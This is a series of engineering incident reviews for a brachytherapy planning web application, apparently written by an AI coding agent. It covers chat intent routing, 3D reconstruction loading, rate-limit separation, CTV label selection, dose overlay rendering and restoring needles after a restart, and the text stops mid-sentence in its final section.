# 2026-08-27 Incident Review — Contextual follow-up returned an unrelated capability menu

> **This is the newest authoritative review entry and is intentionally located at the absolute beginning of the file.**
> It records the follow-up failure after a successful current-dose recomputation:
> the user asked which Planning supplied that calculation, but the UI returned
> a generic English capability menu. The earlier reconstruction, restore, and
> other incident entries remain below as historical-but-still-authoritative
> audit material.

## 1. Executive verdict

This was a real conversation-routing and response-contract defect. The
question was a read-only request for the provenance of an already completed
Dose/DVH operation, but it was classified as `semantic_action`. The live server
log also showed `provider=None`, so the request could not reach the configured
language model. The no-provider branch then fell through to an old hard-coded
English keyword menu. The result was both semantically unrelated and in the
wrong language.

The defect was not caused by the dose recomputation selecting the wrong
Planning. The recomputation tool already resolved the active Planning and used
its saved Needle/Seed geometry. The missing piece was an auditable, local
provenance read path for the natural follow-up question, plus a safe fallback
when the language provider is unavailable.

| Confirmed problem | Root cause | Status |
|---|---|---|
| “本次计算是以哪次规划结果为依据的呢” was routed as `semantic_action` | The local classifier recognized the word “规划” but had no Planning-provenance intent. | **FIXED** |
| The streaming UI returned `I can help with brachytherapy planning...` for that question | `provider=None` sent the unmatched semantic turn to `_rule_based_chat_with_steps_stream()`, whose default branch returned a static English menu. | **FIXED** |
| The non-streaming compatibility path could execute a new plan for the same question | `_rule_based_chat()` used raw substring checks such as `规划`/`plan` without requiring the current turn’s explicit `direct_execution` grant. | **FIXED** |
| A successful dose recomputation did not leave a durable, queryable record of its exact source Planning | The tool returned `planning_id` in result metadata but did not persist a dedicated provenance record in the Planning snapshot. | **FIXED** |

## 2. Direct source and runtime evidence

The current remote checkout and live server log were inspected. The relevant
evidence is:

- `agent_runtime/turn_policy.py::_is_interrogative()` detected the Chinese
  question marker `呢`, while `classify_local_turn()` matched the word
  `规划` in the generic semantic-action branch. There was no dedicated
  provenance predicate.
- `agent_runtime/chat_workflows.py::_chat_with_stream_impl()` used the local
  policy for the trace, then, when `self.brain_available` was false, called
  `_rule_based_chat_with_steps_stream()` for every non-small-talk turn.
- The default branches of `_rule_based_chat()`,
  `_rule_based_chat_with_steps()`, and
  `_rule_based_chat_with_steps_stream()` returned the same hard-coded English
  capability menu regardless of the input language or the user’s actual
  intent.
- The live startup log reported
  `Brain system initialized: provider=None, tools=20`. Thus a correct repair
  must not assume the LLM is available and must never fabricate an answer or
  execute an action when it is not.
- `tool_factory/dose_recompute.py` resolves `active_planning_id(memory)`,
  loads the corresponding Planning snapshot, and calls the authoritative
  manual Dose/DVH computation with the existing `seeds` and `needles`. That is
  the source contract the follow-up should report.

## 3. Root-cause repairs

### 3.1 Planning provenance is now a first-class read-only intent

`is_current_planning_provenance_query()` recognizes questions asking which
Planning produced a current calculation, including Chinese forms such as
“哪次规划”“基于哪个规划”“依据”和 English forms such as “which Planning was
this recomputation based on”. It is evaluated before re-plan and compound-action
classification. The policy is:

- intent: `planning_provenance_query`;
- no router call;
- no completeness review;
- no tool execution; and
- no mutation grant.

The predicate also preserves imperative re-plan requests as actions, so a
question cannot be used as a new authorization frame merely because it contains
the word “Planning”.

### 3.2 The answer is read from the active Planning state, not inferred by the LLM

The three public chat paths now use
`_build_current_planning_provenance_response()` for this intent. It reads
`web.planning_runs.current_planning_context()` and reports:

- the active Planning label and ID;
- lifecycle status and persisted source;
- verified Needle/Seed counts; and
- the precise Dose/DVH calculation boundary when an audit record exists.

If no active Planning exists, the response explicitly says that the source
cannot be confirmed. It does not guess from the previous conversation and it
does not start a planning pipeline.

### 3.3 Dose recomputation now persists its exact source contract

After a successful `dose_recompute`, the tool stores
`dose_recompute_provenance` in the active Planning namespace. The record
contains the Planning ID/label, source type, geometry source, Needle/Seed
counts, timestamp, and explicit flags that segmentation, needle selection, and
the full Planning pipeline were not rerun. The key is included in
`PLANNING_VALUE_KEYS`, so it is captured in the immutable Planning snapshot,
restored with that Planning, and cleared when a genuinely new Planning starts.

`current_planning_context()` now exposes compact Planning lifecycle metadata
and this provenance record without calling the mutating history migration
helper. A read-only follow-up therefore remains read-only at the persistence
boundary as well.

### 3.4 No-provider fallback can no longer execute or fabricate semantic turns

When the language provider is unavailable, only a policy explicitly marked
`direct_execution` may reach the legacy constrained action fallback. Semantic,
knowledge, UI, and other unconfirmed turns receive a same-language message
that says no clinical operation was started. The three old static capability
menus were removed from their default branches, and those branches are also
guarded by the active turn’s explicit execution grant.

There is an additional response-boundary guard for the legacy menu. If any
provider or compatibility branch still emits that exact unrelated menu for a
non-capability question, it is replaced with a safe, same-language response.
An explicit capability request is converted to a localized capability summary,
so Chinese input no longer receives an English menu.

## 4. Verification

The focused remote regression suite passed **41 tests** after the repair,
including the new provenance classifier, localized response, persisted
Planning metadata, no-provider safety guard, and the actual streaming entry
point. Python compilation and `git diff --check` passed for all modified files.

The full remote repository suite passed **766 tests**, with 6 skipped and 4
non-failing warnings. Python compilation and `git diff --check` also passed.

The repaired source was committed as `b1d3bc427` on
`codex/session-task-recovery` and pushed to
`origin/codex/session-task-recovery` on GitHub. The old server was stopped by
its verified PID and the new process was started from this commit. The active
Python server is PID `3146480`, listening on `0.0.0.0:8080`; its startup log is
`/tmp/brachybot_server_b1d3bc427.log`. A loopback request reached the new
server and returned the expected authentication response (`401`), confirming
that the process is live rather than that the endpoint was silently skipped.

# 2026-08-27 Incident Review — 3D Reconstruction Loading Ends Before Completion

> **This is the newest authoritative review entry and is intentionally located at the beginning of the file.**
> It records the separate reconstruction-lifecycle defect reported after the
> restart/rate-limit repair. The previous rate-limit and planning-restore
> review is preserved immediately below as historical-but-still-authoritative
> audit material for that earlier incident.

## 1. Executive verdict

The reported behavior was a real frontend lifecycle bug: the 3D canvas could
continue receiving and adding meshes after the `loading3D` overlay had already
been hidden. The server was not necessarily stopping the reconstruction. The
browser was declaring completion at an intermediate boundary and therefore
made a partially reconstructed scene look finished.

The defect had two independent completion-contract violations:

| Confirmed problem | Root cause | Status |
|---|---|---|
| `loading3D` disappeared while the scene still contained only a subset of the expected structures | `loadCTVAndObstacleMeshes()` awaited the initial CTV/non-traversable-OAR prewarm, then called `startSegmentationMeshPrewarm()` for the remaining OARs through `setTimeout()` without returning or awaiting that promise. The caller therefore received a resolved promise before full structural reconstruction ended. | **FIXED** |
| Automatic planning restore treated a still-running reconstruction as completed after a deadline | `brachybot-dvh-planning.js::_withTimeout()` used `Promise.race()`. When the watchdog won, its catch handler converted the timeout into a resolved promise while the original mesh promise continued in the background. | **FIXED** |
| One concurrent reconstruction could hide the overlay owned by another | 3D code directly toggled one global DOM boolean. A child CTV/OAR/threshold/seed/dose operation could remove the class while a sibling operation was still active. | **FIXED** |
| Workspace switching could leave an old async finalizer able to resurrect the overlay | Clearing the DOM class did not clear ownership held by in-flight reconstruction tasks. | **FIXED** |

The user-visible symptom in the attached screenshot is therefore consistent
with the source-level behavior: early structures are visible, the spinner has
ended, and additional geometry may still arrive later. This was not corrected
by merely increasing a timeout; the repair changes the promise and UI ownership
contracts so “complete” has one unambiguous meaning.

## 2. Direct source evidence

The relevant implementation was inspected in the current remote checkout,
not inferred from the screenshot:

- `web/app/static/js/brachybot-3d-manual.js::loadCTVAndObstacleMeshes()` first
  awaited `prewarmSegmentationMeshes('all', { showStatus: false, batchSize: 3 })`.
- When `oarLabelData` existed, it then invoked
  `startSegmentationMeshPrewarm('all', { allOAR: true, ... })` without
  `await` or a returned promise. `startSegmentationMeshPrewarm()` itself used
  `setTimeout()` and discarded the task promise.
- `web/app/static/js/brachybot-viewer-layout.js::reconstruct3D()` and
  `::reconstructOrgan3D()` each directly added and removed the same
  `#loading3D.active` class. This made completion of any one caller look like
  completion of the whole scene.
- `web/app/static/js/brachybot-dvh-planning.js` started dose, structural, and
  seed reconstruction concurrently. Its old `Promise.race()` watchdog allowed
  `Promise.all(_meshPromises)` to resolve at the watchdog deadline rather than
  at the underlying mesh completion boundary.
- The automatic restore intentionally returned its cheap data-plane result
  before all meshes were done. That remains a valid responsiveness policy, but
  it requires the actual background mesh promises to retain the 3D loading
  ownership until they settle. The old code had no such ownership contract.

## 3. Root-cause repairs

### 3.1 Full structural reconstruction now has a real completion boundary

`loadCTVAndObstacleMeshes()` now:

1. begins a case-owned 3D loading token;
2. awaits the initial CTV and safety-critical/non-traversable mesh pass;
3. awaits the complete `allOAR: true` pass when OAR labels are available;
4. performs the final camera/reconciliation work inside that promise; and
5. releases the token only in `finally` after the complete structural promise
   has settled.

The remaining OAR pass is still batched at three requests so the server and
browser are not flooded, but it is no longer an unobserved fire-and-forget
side effect. A caller that awaits this function now receives a promise whose
resolution means that the full requested structural reconstruction has ended.

### 3.2 Loading state is reference-counted by task ownership

`brachybot-viewer-layout.js` now owns a token registry for `#loading3D`:

- `beginViewer3DLoading(message)` registers one actual task owner;
- `updateViewer3DLoading(token, message)` changes only that owner’s progress
  text;
- `endViewer3DLoading(token)` releases only that owner; and
- `resetViewer3DLoading()` invalidates all owners during a workspace switch.

The CTV/OAR structural pass, seed/needle loader, dose-isosurface loader,
individual organ reconstruction, threshold-mask reconstruction, and standalone
segmentation prewarm paths all use these tokens. The overlay remains visible
while any real 3D task is active and is hidden only after the last owner has
settled. Progress text distinguishes target/obstacle surfaces, remaining OAR
surfaces, dose surfaces, seed/needle geometry, and final scene reconciliation.

This is deliberately a reference-counted lifecycle rather than a second ad hoc
spinner. It handles legitimate concurrent products without allowing one
completion callback to hide another task’s loading state.

### 3.3 Watchdogs no longer redefine completion

The planning restore watchdog is now a soft watchdog. It logs when a 3D task
has exceeded its expected duration, but it continues to await the original
promise. A warning is not a successful completion and cannot trigger report
capture or release the loading state against a partially built scene.

The underlying loader still returns its actual error when it fails. A network,
HTTP, parsing, or backend failure is not converted into a successful-looking
reconstruction; it is handled by the existing case-scoped error path.

### 3.4 Workspace transitions clear lifecycle ownership

`clearClientWorkspace()` now clears both the visible DOM state and the token
registry. A late promise finalizer from the previous session can safely run,
but it cannot make the new case’s loading overlay reappear or mutate the new
case’s scene. The existing generation/session guards continue to prevent stale
geometry from being attached to the new workspace.

## 4. Regression and deployment verification

The focused remote regression set passed **163 tests** with 3 warnings. It
covers the revised full-OAR completion boundary, token-based loading ownership,
workspace reset behavior, planning restore, rate-limit retries, uploaded-mask
staging, and existing viewer contracts.

The complete remote repository suite passed **762 tests**, with 6 skipped and 4
non-failing warnings. Python compilation and `git diff --check` passed. The
modified browser files passed Node syntax checks locally with the bundled Node
runtime.

The cache-busted resources for this repair are:

- `brachybot-ui-api.js?v=48`;
- `brachybot-viewer-layout.js?v=35`;
- `brachybot-3d-manual.js?v=68`; and
- `brachybot-dvh-planning.js?v=28`.

The repaired source was committed as `6850b5078` on
`codex/session-task-recovery` and pushed to GitHub. The server was restarted
from `/home/lht/snap/brachyplan/BrachyBot` after that commit; the new process
was verified as PID `3101120`, listening on `0.0.0.0:8080`. The acceptance check
is not merely that the first CTV mesh appears: the `loading3D` overlay must
remain active until the full structural, seed/needle, and dose tasks settle,
and only then disappear.

## 5. Scope boundary

This repair changes the 3D reconstruction completion contract, loading
presentation ownership, watchdog semantics, and workspace cleanup. It does not
alter CTV/OAR label interpretation, needle geometry, seed positions, dose
calculation, DVH mathematics, collision rules, or clinical validation.

---

# 2026-08-27 Incident Review — Restart Planning Restore, Rate-Limit Failures, and 3D Visual Delivery

> **This is the newest authoritative review entry and is intentionally located at the beginning of the file.**
> It records the restart failure and the `Rate limit exceeded` messages shown by
> the browser. The earlier 2026-08-26 review remains below as historical audit
> material; it is not a substitute for this entry.

## 1. Executive verdict

The reported post-restart failure was real. It was not caused by the planning
arrays being absent from durable storage, and it was not safe to hide the error
messages or merely increase a single global request limit. The remote snapshot
and server logs showed that the active planning result contained 54 Seeds, 8
Needles, 4 dose levels, 15 planning meshes, dose-overlay metadata, and DVH
data. The server also successfully served `seeds_3d`, the dose overlay, and
all four dose-isosurface thresholds after hydration. The missing objects and
the red browser messages were therefore caused by the delivery path between
the restored workspace and the browser.

| Confirmed problem | Root cause | Status |
|---|---|---|
| `CTV mask import failed: Rate limit exceeded` | A single per-IP 120-request/60-second bucket was shared by chat, uploads, planning mutations, CT/label reads, mesh reconstruction, and dose visualization. Hydration/retry traffic could consume the same budget before a legitimate mask request reached the handler. | **FIXED** |
| Repeated `3D reconstruction failed: Rate limit exceeded` | POST-based but idempotent viewer reconstruction endpoints were charged to the same mutation bucket as unrelated operations; concurrent restore/prewarm/reconstruction calls multiplied the request burst. | **FIXED** |
| Restored Seeds/Needles/Dose were absent or incomplete in the viewer | Frontend restore had no complete 429 retry contract for every planning visual endpoint, and `loadSeeds3D()`/iso loading could be entered concurrently. One failed request was allowed to make the essential restore look incomplete. | **FIXED** |
| Existing dose isosurfaces disappeared after a transient failure | `loadAllIsoSurfaces()` cleared the existing scene and Data Tree entries before replacement requests succeeded. A 429/202/5xx therefore converted a temporary transport problem into permanent local data loss. | **FIXED** |
| Old valid geometry could be overwritten by a weaker restore caller | Metadata-only and full 3D loads had no single-flight/serialization contract; a later caller could clear or replace work from the earlier caller. | **FIXED** |
| Background reconstruction emitted user-facing failure spam | Silent background reconstruction still published errors on some paths, and the multi-label CTV loop swallowed terminal errors before converting them to a misleading “No CTV labels” message. | **FIXED** |

## 2. Evidence collected before changing code

The authoritative remote workspace was inspected directly. The persisted
snapshot was not inferred from the screenshot:

- active planning identity: `planning-06daf66fdd7144938f90ed750d299733`;
- `runs`: 4;
- `trajectories`: 8;
- `seeds`: 54;
- `needles`: 8;
- `doseLevels`: 4;
- planning `meshes`: 15;
- `doseOverlay`: present;
- `dvh`: present.

The post-restart hydration log showed the same case passing through its CT,
planning-result, and background phases. The final planning-result hydration
decoded 96 result keys and restored the planning aliases. Subsequent server
requests logged `seeds_3d returning 54 seeds, 8 needles`, a successful original-
grid dose overlay request, and successful 120, 180, 240, and 480 Gy
isosurface requests. This establishes that the durable plan and backend
calculation products survived the restart.

The browser errors were nevertheless valid symptoms of a real transport
failure. Before the repair, `web/server_support.py::rate_limit()` used one
sliding-window bucket of 120 requests per client IP for every decorated route.
The viewer's reconstruction requests use POST even though they are reads from
session-owned state, so they were indistinguishable from a mutation. A normal
case restore can request CT/labels, dozens of structure meshes, Seeds,
Needles, dose overlay data, dose slices, isosurfaces, guide data, screenshots,
and retries in the same time window. When the bucket filled, the route handler
was never reached; the browser received a genuine 429 response with
`code=rate_limit_exceeded`.

There was a second, independent state bug. The restore path called the same
visual loaders as explicit reconstruction and segmentation prewarm. `loadSeeds3D()`
and `loadAllIsoSurfaces()` did not serialize all callers. More importantly,
`loadAllIsoSurfaces()` cleared the previous dose surfaces before it knew whether
the replacement requests would succeed. Thus a transient 429 could erase an
otherwise valid dose display, which explains why the Data Tree could contain
the plan while the 3D/2D visual products were blank or stale.

## 3. Root-cause repairs

### 3.1 Separate data-plane and mutation rate limits

`web/server_support.py` now selects an explicit bucket per request:

- the original 120 requests per 60 seconds remains the default bucket for
  chat, uploads, segmentation, plan edits, and other state-changing work;
- GET requests and the idempotent viewer/planning visual endpoints use a
  separate data-plane bucket, configurable through
  `BRACHYBOT_DATA_RATE_LIMIT_REQUESTS`, with a safe default of 1,200 per 60
  seconds;
- the response includes `code=rate_limit_exceeded`, `retry_after_ms`, and
  standard `Retry-After` headers, and the server logs the path, method, bucket,
  client, and computed wait time;
- API-key and remote-start security behavior was not disabled. The repair does
  not turn the server into an unlimited endpoint and does not weaken any
  clinical validation.

The data bucket includes `/api/viewer/*`, `/api/surgical-guides/mesh`, and the
case-owned planning visual products (`results`, `seeds_3d`, `dose_isosurface`,
`dose_overlay`, `dose_overlay_volume`, `dose_overlay_slice`, and
`dose_contour_slice`). This classification is based on the operation's state
semantics, not on whether the HTTP method happens to be GET or POST.

### 3.2 Make every restore request retry-aware and case-scoped

The following frontend paths now recognize both hydration `202` and limiter
`429` responses, honor the server wait value with bounded backoff, and stop
mutating state after a Session/case transition:

- `brachybot-3d-manual.js`: Seeds/Needles, dose isosurfaces, and segmentation
  mesh prewarm;
- `brachybot-viewer-volume.js`: label volume, guide skin, dose-overlay volume,
  and dose-overlay slice delivery;
- `brachybot-viewer-layout.js`: CTV multi-label and generic/individual 3D
  reconstruction;
- `brachybot-ui-api.js`: segmentation import polling, with in-flight
  coalescing for the same Session and request body.

The retry is deliberately bounded and case-scoped. A stale response cannot
paint geometry into a newly selected case, and a background retry cannot create
an error chat message for a request the user did not initiate. A user-triggered
terminal backend error remains visible with its actual cause.

### 3.3 Serialize and transactionally replace visual products

`loadSeeds3D()` now has a case-scoped single-flight promise, so restore,
planning refresh, and explicit reconstruction share one authoritative fetch and
one scene update. `loadAllIsoSurfaces()` now serializes metadata-only versus
full 3D callers and no longer clears existing surfaces at the beginning.

For each requested threshold, the loader now:

1. retains the previous valid mesh while fetching;
2. replaces it only after a successful response with a non-empty mesh;
3. preserves the previous Data Tree presentation flags and opacity;
4. records a transient failure without marking a still-visible old mesh as
   absent; and
5. removes only obsolete thresholds after the requested set has been
   reconciled.

Legacy `planning.meshes` dose mirrors are cleaned only for obsolete dose rows;
Seeds, Needles, guides, and other planning artifacts are not removed by this
cleanup.

### 3.4 Correct error publication

Silent background calls now remain silent for deferred/missing/rate-limited
viewer responses. The CTV multi-label loop no longer converts a terminal
request failure into the unrelated “No CTV labels” message when the call was
user initiated. This preserves useful diagnostics while preventing four or
more identical red messages from concurrent background work.

## 4. Verification and acceptance criteria

The focused remote regression group passed **134 tests** with 3 warnings after
the repair. It covers uploaded-mask staging, the independent rate-limit bucket,
planning visual retries, single-flight loading, transactional iso replacement,
viewer visibility, and frontend cache-version contracts. Python compilation of
`web/server_support.py`, JavaScript syntax checks for the modified browser
modules, and `git diff --check` also passed.

The complete remote repository suite subsequently passed **761 tests**, with 6
tests skipped and 4 non-failing warnings. The first complete run exposed only
two stale assertions that still expected the previous frontend cache versions;
those assertions were updated and the complete suite was rerun successfully.

The repaired source was committed as `b40d1fce0` on
`codex/session-task-recovery` and pushed to GitHub. The remote server was then
restarted from that checkout. The new process was verified as PID `3092181`,
listening on `0.0.0.0:8080`, with the cache-busted layout/volume/manual/DVH
assets returning HTTP 200 for versions `v34`, `v43`, `v67`, and `v27`.

The acceptance flow for this incident is:

1. restart the server while a completed plan is persisted;
2. reconnect the same Session and wait for hydration to reach its ready state;
3. verify the Data Tree and `/api/planning/results` expose the active planning
   identity, 54 Seeds, 8 Needles, dose metadata, and DVH;
4. verify `/api/planning/seeds_3d`, `/api/planning/dose_overlay`, and all
   configured dose-isosurface thresholds return without a 429 caused by the
   restore burst;
5. verify the 3D scene and all three 2D canvases receive the restored
   geometry/overlay; and
6. submit a legitimate CTV mask import after restore without it being rejected
   merely because visual hydration traffic used the same client IP.

The old red bubbles may remain in a persisted chat/history view because they
are historical events. That does not mean the new server still generated them;
the decisive check is a fresh hard reload after the cache-busted scripts are
served and the absence of new rate-limit/reconstruction errors in the current
server log.

## 5. Scope boundary

This repair changes request classification, retry behavior, concurrency, and
visual-state transaction boundaries only. It does not alter needle collision
rules, obstacle labels, CTV plausibility thresholds, dose calculation,
DVH mathematics, prescription conversion, or plan-quality criteria. A genuine
backend validation failure remains a failure and is not converted into a
successful-looking plan.

---

# 2026-08-26 Incident Review and Root-Cause Repair — Historical Status

> **This is the current section and is intentionally located at the beginning of the file.**
> This section is historical and is retained unchanged for auditability. The
> 2026-08-27 entry above is now the authoritative status for restart restore,
> rate limiting, and planning visual delivery.

## 1. Executive verdict

Six user-visible or reachable incidents were reproduced or traced to concrete
current-code paths. The original four incidents, the restored-Needle failure,
and the concurrent read-only label-export failure now have root-cause repairs
in the remote working tree. A second inspection of every repair found and fixed
one additional dose-volume ownership race and one incorrect regression-test
assertion before closure.

| Incident | Current source status | Deployed status | Evidence summary |
|---|---|---|---|
| Add Needle rejected every restored automatic Needle | **FIXED** | **LIVE** | The transaction now validates only new or geometrically changed submitted Needles; the full-plan optimistic-version commit remains authoritative. |
| Uploaded CTV was rejected as 12,970 cm3 / 105% of body | **FIXED** | **LIVE** | The selected source label is captured, validated, aligned, and normalized to an active binary CTV before plausibility checks and planning. Legacy restored snapshots are migrated before publication. |
| 2D label/dose appearance changed during slice scrubbing and recovered after about 0.5 s | **FIXED** | **LIVE** | A compact original-grid dose volume is loaded once and sampled synchronously for all three axes; the broken slice-cache key contract is also corrected. |
| Initial streaming assistant response was clipped until manual scroll or the next tool call | **FIXED** | **LIVE** | Bottom-follow is now layout-aware across streaming Markdown, Thinking rows, the workflow dock, footer insertion, and flex reflow. The workflow dock is no longer reparented into the answer row. |
| Restored automatic Needles were silently withheld after server restart | **FIXED** | **LIVE** | The persisted seven Needle geometries were present; display-time safety revalidation was incorrectly applied against changed/shared current masks. The repair persists safety-input provenance and exposes changed-input geometry as review-only instead of deleting it. |
| Restored label-volume export failed while merging model OAR labels | **FIXED** | **LIVE** | Restored NPY arrays can be read-only memmaps; the merge now detaches a writable `uint16` buffer before assignment. |

No collision rule, obstacle label, CTV plausibility threshold, trajectory safety
threshold, dose calculation, DVH calculation, prescription conversion, or plan
quality criterion was weakened to make these incidents disappear.

## 2. Exact failure analysis and repairs

### 2.1 Restored plan rejected by Add Needle

#### Confirmed failure mechanism

`/api/manual_planning/update_geometry` receives the complete visible Needle list
after every edit. Before this repair, the route passed that complete list to
`_validate_manual_needle_safety()`. After restart there was no transaction-local
baseline in the browser, so adding one Needle caused all seven previously accepted
automatic Needles plus the new Needle to be revalidated against the current
obstacle representation. The error therefore listed the historical Needles even
though the operator changed only one object.

This was a transaction-boundary defect, not evidence that collision validation
should be removed. Whole-plan optimistic version checks and whole-plan storage were
already correct; the safety gate had the wrong input set.

#### Implemented repair

- `web/server_support.py::_changed_manual_needles()` matches the previous and
  submitted plans by stable Needle ID first and `trajectory_id` second.
- It compares the physical first/last world-coordinate endpoints with a strict
  absolute tolerance and returns only new or geometrically changed segments.
- `web/routes/planning_routes.py::api_manual_planning_update_geometry()` passes
  only that changed set to `_validate_manual_needle_safety()`.
- The complete submitted plan is still normalized, version checked, persisted,
  and used for Seed reprojection. Deleted Needles and explicit empty lists retain
  their existing transaction semantics.
- The existing fail-closed collision routine, CT/body checks, and hard-obstacle
  labels are unchanged.

#### Acceptance contract

Completed automatic plan -> restart -> restore -> Add Needle must validate the
new Needle, retain the seven historical Needles, preserve the plan version
contract, and either commit the full resulting geometry or reject only the
changed Needle with the previous geometry retained.

### 2.2 Multi-label CTV upload selected the entire foreground

#### Measured source evidence

The reported file was inspected on the remote host rather than inferred from the
error message:

- array shape: `512 x 512 x 48`;
- spacing: `0.6836 x 0.6836 x 5.0 mm`;
- label 1: `5,534,753` voxels, approximately `12,932 cm3`;
- label 2: `16,065` voxels, approximately `37.5366 cm3`;
- union of every positive label: `5,550,818` voxels, approximately
  `12,969.735 cm3`.

The union exactly reproduced the displayed 12,970 cm3 failure. The persisted UI
control selected target label `2`, but the old upload request did not transmit
that value and the tool interpreted every positive voxel as CTV. More seriously,
downstream planning reserves active CTV value `1` for target and values `2/3` for
embedded obstacles, so forwarding the raw source labels could turn the actual
source target label into a hard obstacle.

#### Implemented repair

- `tool_factory/segmentation_alignment.py` now provides strict positive discrete
  label parsing and `select_label_as_binary()`.
- A requested target must be a finite positive integer. Booleans, fractions,
  non-finite values, and absent labels in a genuine multi-label file are rejected.
- A single-positive-label mask remains compatible with exports encoded as a
  nonstandard foreground value such as 255.
- `tool_factory/CTV_seg/__init__.py` aligns the source label image to the CT LPI
  physical grid, selects exactly one source label, and emits an active `uint8`
  `{0,1}` CTV. Source label IDs/counts remain in provenance metadata only.
- `web/app/static/js/brachybot-ui-api.js` captures the target label together with
  the upload's owning Session, CT path, and tumor type; it does not reread a live
  control after a case switch.
- `/api/segmentation` validates and forwards `target_value`, atomically replaces
  stale model-derived CTV label maps/statistics, and persists normalization
  metadata.
- `web/workspace_store.py::_repair_restored_manual_ctv()` migrates legacy restored
  manual CTV arrays before the hydrated Agent is published. It uses the persisted
  `targetValue`, rebuilds the active mask as binary, clears stale embedded/model
  sidecars, recomputes voxel count and physical volume, and records provenance.

#### Direct rechecks

- Real uploaded file with target label 2: success, `16,065` target voxels,
  `37,536.593 mm3`, source labels `[1,2]`, active labels `[0,1]`.
- Real legacy snapshot migration: changed `true`, selected source label `2`,
  `16,065` target voxels, `37,536.593 mm3`, active labels `[0,1]`.
- Manual CTV and OAR LPI orientation regression: passed. OAR remains multi-label;
  only the active CTV transport contract is normalized to binary.

### 2.3 Slice scrubbing changed apparent label opacity/brightness

#### Confirmed failure mechanism

The CTV/OAR label raster is composited synchronously with the CT slice. The dose
heatmap is a separate canvas layer. On a slice cache miss, the dose layer was
cleared/hidden while an asynchronous `/dose_overlay_slice` request ran. Removing
the colored dose contribution made the underlying labels appear to change
opacity/brightness; when the request returned, the intended appearance came back.

The old cache also had an independent contract bug: the writer used a
generation-prefixed key while the reader looked up `axis_index`, so valid fetched
slices were effectively never cache hits in the reader.

#### Implemented repair

- `web/routes/planning_routes.py::_dose_overlay_volume_array()` centralizes a
  finite original-CT-grid `(Z,Y,X)` dose representation for display endpoints.
- `/api/planning/dose_overlay_volume` returns a display-only linear little-endian
  `uint16` volume with shape, minimum, quantization scale, Planning ID, and dose
  generation headers. The float planning/DVH arrays are not replaced.
- The browser downloads that compact volume once and synchronously samples axial,
  sagittal, and coronal slices while the slider moves.
- Axial display reversal and sagittal/coronal row/column orientation exactly match
  the existing CT renderer and slice endpoint.
- A 2,048-entry color lookup table removes repeated palette/config work from the
  per-pixel scrub loop.
- `doseOverlaySliceCacheKey()` is now shared by the fallback writer and reader,
  including the dose generation.
- The existing per-slice endpoint remains a bounded fallback while the volume is
  downloading or if the compact request fails.
- Data Tree opacity remains a canvas-layer property and is applied immediately;
  quantized pixels remain fully opaque internally.

#### Second-pass defect found and fixed

The first implementation used one global in-flight Promise. If Planning changed
while the old volume was downloading, the new overlay could receive that old
Promise; identity checks would correctly discard the old bytes, but the new
overlay would never start its own download. The final implementation tracks
`_doseOverlayVolumeOwner`, aborts an old owner's request, and creates a distinct
request for the new owner. Regression coverage asserts this ownership fence.

### 2.4 Streaming response initially clipped above the composer

#### Confirmed failure mechanism

The chat column is a flex layout containing `chatMessages`, `chatTodoDock`, and the
composer. The previous `scrollToBottom()` made one synchronous assignment:
`scrollTop = scrollHeight`. That assignment could run before Markdown rendering,
Thinking expansion/collapse, workflow-dock display, footer insertion, or flex
layout had established the final `scrollHeight/clientHeight`.

Two concrete paths amplified the race:

- `createLiveThinkingChain()` appended the initial Thinking row without requesting
  a bottom scroll;
- when the first final text arrived, `chat-todo.js` moved `todo.root` out of the
  fixed dock into the response wrapper. That resized both the message viewport and
  the message contents in one event. The next tool event happened to scroll again,
  which explains why the answer then became fully visible.

#### Implemented repair

- `requestChatScrollToBottom()` owns chat follow state and performs an immediate
  anchor plus two `requestAnimationFrame` settlement passes.
- A `ResizeObserver` on `chatMessages` handles sibling workflow-dock changes that
  alter the message viewport without mutating the message DOM.
- Streaming Markdown updates, live Thinking creation, step append/update,
  Thinking collapse/cancel, response creation/finalization, and footer insertion
  all request the same bottom anchor.
- The old `scrollIntoView({behavior:'smooth'})` step path was removed; it could
  scroll an outer ancestor and competed with the chat container.
- Sending a new user turn force-enables follow. If the user deliberately scrolls
  more than 64 px away from the bottom, subsequent stream updates do not pull the
  viewport away from history.
- `todo.root` remains in `chatTodoDock` for its complete lifetime and is never
  reparented into an answer row.
- Cache revisions were advanced to `brachybot-chat-core.js?v=14` and
  `brachybot-chat-todo.js?v=20`.

### 2.5 Restored automatic Needles were hidden after server restart

#### Confirmed failure mechanism

The persisted workspace was inspected on the remote host. The active planning
snapshot still contained seven `verified_needle_geometry` entries and seven
serialized trajectories; the Needle data was not lost during checkpointing or
hydration. The failure happened later in
`/api/planning/seeds_3d`: the route rechecked every saved automatic Needle
against the currently hydrated CTV/OAR/Data Tree obstacle state and discarded
each one when that state rejected the geometry. Seeds remained visible because
their rendering path does not apply that segment-level safety filter.

The active plan and shared segmentation aliases are not one transaction. A
restart can hydrate an older plan and then publish a newer CTV/OAR or Data Tree
selection (the reported session was explicitly marked with stale downstream
artifacts). The old route treated that legitimate version mismatch as proof
that the saved geometry itself was unsafe, so the Viewer appeared to have no
Needles and the log misleadingly reported `returning 35 seeds, 0 needles`.

A second representation mismatch made false rejection more likely: planning
validates the normalized `ctv_array` plus embedded hard structures merged into
the OAR mask, while the Viewer preferred the full multi-label CTV array when it
performed its recheck. That is not the same safety input contract.

#### Implemented repair

- `tool_factory/seed_plan/planning_pipeline.py` records a versioned
  `needle_safety_context` next to `verified_needle_geometry`. It fingerprints
  the CT physical frame, original-grid CTV/OAR masks, and effective mandatory
  plus Data Tree obstacle IDs. The fingerprint is persisted with the immutable
  planning run through `web/planning_runs.py` and therefore survives restart,
  run activation, and workspace checkpointing.
- `web/routes/viewer_routes.py` now uses the same normalized CTV/OAR contract
  as planning. When the current safety inputs match the stored context, the
  exact persisted world-coordinate endpoints are revalidated as defense in
  depth. When inputs differ, the already-validated automatic geometry remains
  visible for review and the response marks `safety_check=stale`,
  `plan_needs_replan=true`, and Planning as stale. It is never presented as
  current-safe.
- Legacy plans that predate the provenance field are shown as
  `safety_check=legacy_verified` with the same explicit re-plan warning rather
  than being silently emptied. This is necessary to recover the user's
  existing plan while making the missing historical input identity visible.
- Manual or newly edited Needle endpoints still use the current original-grid
  fail-closed validator. A stale automatic result is review-only; it does not
  weaken Add Needle, edit, dose, or clinical safety checks.
- `web/app/static/js/brachybot-3d-manual.js` preserves the restored geometry,
  exposes the stale/legacy warning once, and keeps the safety state in the
  Planning Data Tree. The API also returns the active planning ID rather than
  relying only on a manual-edit ID.

#### Acceptance contract

Completed automatic plan -> server restart -> workspace hydration -> Viewer
reload must retain the persisted Needles. If the exact CT/CTV/OAR/obstacle
